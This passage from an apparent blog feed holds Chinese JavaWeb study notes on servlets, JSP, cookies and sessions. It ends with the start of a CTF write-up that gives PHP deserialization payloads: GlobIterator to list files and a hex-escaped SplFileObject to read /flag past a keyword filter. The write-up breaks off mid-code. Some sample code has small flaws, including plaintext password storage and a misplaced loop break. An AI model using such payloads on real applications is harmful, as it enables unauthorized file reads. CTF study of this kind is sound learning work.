class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/request-demo/registerServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.接受用户数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;username&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;password&quot;</span>);<br><br>        <span class="hljs-comment">//2.封装用户对象</span><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setUsername(username);<br>        user.setPassword(password);<br><br>        <span class="hljs-comment">//3.调用mapper，根据用户名查询用户对象</span><br><span class="hljs-comment">//        String resource = &quot;mybatis-config.xml&quot;;</span><br><span class="hljs-comment">//        InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="hljs-comment">//        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="hljs-comment">//        上面为旧方法，下面用调用静态方法解决：</span><br>        <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> SqlSessionFactoryUtils.getSqlSessionFactory();<br><br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<br>        <span class="hljs-type">UserMapper</span> <span class="hljs-variable">userMapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> userMapper.selectByUsername(username);<br><br>        <span class="hljs-comment">//4.判断对象是否存在</span><br>        <span class="hljs-keyword">if</span> (u == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">//用户名不存在，添加用户</span><br>            userMapper.add(user);<br>            sqlSession.commit();<br>            sqlSession.close();<br>            resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;注册成功&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//用户已存在，提示</span><br>            resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>            resp.getWriter().write(<span class="hljs-string">&quot;用户已存在&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/JavaWeb/1-1/SqlSessionFactoryUtils1.png"></p><p><img src="/img/JavaWeb/1-1/SqlSessionFactoryUtils2.png"></p><h2 id="六、JSP"><a href="#六、JSP" class="headerlink" title="六、JSP"></a>六、JSP</h2><p>先导入最先的需要的Maven库和其依赖</p><h3 id="1、Java-Server-Pages-Java服务端页面"><a href="#1、Java-Server-Pages-Java服务端页面" class="headerlink" title="1、Java Server Pages/Java服务端页面"></a>1、Java Server Pages/Java服务端页面</h3><p>一种动态的网页技术，可以定义HTML、JS、CSS等静态内容，还可以定义Java代码的动态内容</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;%<br>        System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>    <span class="hljs-comment">//在这里写Java</span><br>    %&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="2、EL表达式和JSTL"><a href="#2、EL表达式和JSTL" class="headerlink" title="2、EL表达式和JSTL"></a>2、EL表达式和JSTL</h3><h5 id="EL表达式特点（四大域对象）"><a href="#EL表达式特点（四大域对象）" class="headerlink" title="EL表达式特点（四大域对象）"></a>EL表达式特点（四大域对象）</h5><p><img src="/img/JavaWeb/1-1/EL1.png"></p><h5 id="ServletDemo1设定："><a href="#ServletDemo1设定：" class="headerlink" title="ServletDemo1设定："></a>ServletDemo1设定：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/JSTL&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.存储到request域中</span><br>        req.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUserRequest&quot;</span>);<br>        req.setAttribute(<span class="hljs-string">&quot;status&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//2.转发到el-demo.jps</span><br>        req.getRequestDispatcher(<span class="hljs-string">&quot;/el-demo.jsp-demo.jsp&quot;</span>).forward(req,resp);<br>    <br>        <span class="hljs-comment">//3.遍历粗存的举例</span><br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;bbb&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;ccc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="jsp引用："><a href="#jsp引用：" class="headerlink" title="jsp引用："></a>jsp引用：</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;c&quot;</span> uri=<span class="hljs-string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%--<span class="hljs-keyword">if</span>判断--%&gt;<br>    &lt;c:<span class="hljs-keyword">if</span> test=<span class="hljs-string">&quot;$&#123;status&#125; == 1&quot;</span>&gt;<br>        &lt;h1&gt;Test Successful&lt;/h1&gt;<br>    &lt;/c:<span class="hljs-keyword">if</span>&gt;<br>    &lt;c:<span class="hljs-keyword">if</span> test=<span class="hljs-string">&quot;$&#123;status&#125; == 0&quot;</span>&gt;<br>        &lt;h1&gt;Test fail&lt;/h1&gt;<br>    &lt;/c:<span class="hljs-keyword">if</span>&gt;<br>&lt;%--<span class="hljs-keyword">for</span>遍历--%&gt;<br>    &lt;c:forEach items=<span class="hljs-string">&quot;$&#123;list&#125;&quot;</span> <span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;<br>        &lt;h1&gt;$&#123;item&#125;&lt;/h1&gt;<br>    &lt;/c:forEach&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="3、MVC模式和三层架构"><a href="#3、MVC模式和三层架构" class="headerlink" title="3、MVC模式和三层架构"></a>3、MVC模式和三层架构</h3><p><img src="/img/JavaWeb/1-1/MVC1.png"></p><p><img src="/img/JavaWeb/1-1/MVC2.png"></p><p><img src="/img/JavaWeb/1-1/MVC3.png"></p><h2 id="七、Cookie和Session"><a href="#七、Cookie和Session" class="headerlink" title="七、Cookie和Session"></a>七、Cookie和Session</h2><h3 id="1、Cookie"><a href="#1、Cookie" class="headerlink" title="1、Cookie"></a>1、Cookie</h3><h5 id="Cookie的概念："><a href="#Cookie的概念：" class="headerlink" title="Cookie的概念："></a>Cookie的概念：</h5><p>Cookie: 客户端会话技术，将数据保存到客户端，以后每次请求都携带Cookie数据进行访问。</p><p><img src="/img/JavaWeb/1-1/Cookie1.png"></p><p><img src="/img/JavaWeb/1-1/Cookie2.png"></p><h5 id="Cookie的使用："><a href="#Cookie的使用：" class="headerlink" title="Cookie的使用："></a>Cookie的使用：</h5><h5 id="储存："><a href="#储存：" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/aServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.创建Cookie对象</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUser&quot;</span>);<br>        <span class="hljs-comment">//设置存活时间</span><br>        cookie.setMaxAge(<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//2.发送Cookie</span><br>        resp.addCookie(cookie);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取："><a href="#读取：" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/bServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Cookie数组</span><br>        Cookie[] cookies = req.getCookies();<br>        <span class="hljs-comment">//2.遍历数组</span><br>        <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> cookie.getName();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;username&quot;</span>.equals(name))&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cookie.getValue();<br>                System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + value);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Cookie不能直接储存中文，要进行URL编码："><a href="#Cookie不能直接储存中文，要进行URL编码：" class="headerlink" title="Cookie不能直接储存中文，要进行URL编码："></a>Cookie不能直接储存中文，要进行URL编码：</h5><h5 id="储存：-1"><a href="#储存：-1" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/aServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.创建Cookie对象</span><br>        <span class="hljs-comment">//1-1.创建中文字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>        <span class="hljs-comment">//1-2.URL编码</span><br>        value = URLEncoder.encode(value, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;username&quot;</span>, value);<br>        <span class="hljs-comment">//设置存活时间</span><br>        cookie.setMaxAge(<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//2.发送Cookie</span><br>        resp.addCookie(cookie);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取：-1"><a href="#读取：-1" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/bServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Cookie数组</span><br>        Cookie[] cookies = req.getCookies();<br>        <span class="hljs-comment">//2.遍历数组</span><br>        <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> cookie.getName();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;username&quot;</span>.equals(name))&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cookie.getValue();<br>                <span class="hljs-comment">//URL解码</span><br>                value = URLDecoder.decode(value, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>                System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + value);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2、Session"><a href="#2、Session" class="headerlink" title="2、Session"></a>2、Session</h3><h5 id="服务端会话跟踪技术，将数据保存到服务端"><a href="#服务端会话跟踪技术，将数据保存到服务端" class="headerlink" title="服务端会话跟踪技术，将数据保存到服务端"></a>服务端会话跟踪技术，将数据保存到服务端</h5><p><img src="/img/JavaWeb/1-1/Session1.png"></p><p>Session是基于Cookie实现</p><p><img src="/img/JavaWeb/1-1/Session2.png"></p><p><img src="/img/JavaWeb/1-1/Session3.png"></p><h5 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h5><h5 id="储存：-2"><a href="#储存：-2" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;SessionDemo1&quot;, value = &quot;/SessionDemo1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Session对象</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-comment">//2.存储对象</span><br>        session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUserSession&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取：-2"><a href="#读取：-2" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;SessionDemo2&quot;, value = &quot;/SessionDemo2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionDemo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br>        System.out.println(username);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb学习</title>
    <link href="/2023/05/02/JavaWeb_Start/"/>
    <url>/2023/05/02/JavaWeb_Start/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb学习"><a href="#JavaWeb学习" class="headerlink" title="JavaWeb学习"></a>JavaWeb学习</h1><h2 id="我们将在此之后学习并更新Java-Web方面的相关内容，包括Java的基本开发框架。"><a href="#我们将在此之后学习并更新Java-Web方面的相关内容，包括Java的基本开发框架。" class="headerlink" title="我们将在此之后学习并更新Java Web方面的相关内容，包括Java的基本开发框架。"></a>我们将在此之后学习并更新Java Web方面的相关内容，包括Java的基本开发框架。</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF周报-2223Q2-Week10</title>
    <link href="/2023/04/28/CTF-2223Q2-Week10/"/>
    <url>/2023/04/28/CTF-2223Q2-Week10/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、POP"><a href="#一、POP" class="headerlink" title="一、POP"></a>一、POP</h2><h3 id="1、prize-p5（16进制绕过-字符串逃逸）"><a href="#1、prize-p5（16进制绕过-字符串逃逸）" class="headerlink" title="1、prize_p5（16进制绕过/字符串逃逸）"></a>1、prize_p5（16进制绕过/字符串逃逸）</h3><p>本题可以从$_GET[‘cata’]，开始构架POP链，同时要绕过下面的正则匹配。其中下面这个语句可以直接使用php的原生类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br></code></pre></td></tr></table></figure><p>然后我们首先要知道flag位置，查找有f的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;GlobIterator&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;/*f*&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>看到了就叫flag</p><p>由于后面有过滤object，但是可以使用原生类SplFileObject，来获取flag，看了一下方法，需要使用16进制绕过去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?cata=O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;S:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;SplFile\4fbject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>还可以使用字符串逃逸</p><p>原理：1、定义一个abscond方法，就是进行替换的，这个方法本没有错，错的是，可以替换成不同的长度；2、这里举个列，假如我们传进去的是NSSaaa，那么他经过转换就直接接收了hacker，然后aaa就逃出去了；3、然后他对email参数转进来的东西，进行了过滤，所以我们不能用，因为我们要传flag，然后就是phone,if(is_array($escape[‘phone’]))这里判断他必须是一个数组，所以我们要改，最后就是在name中传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span 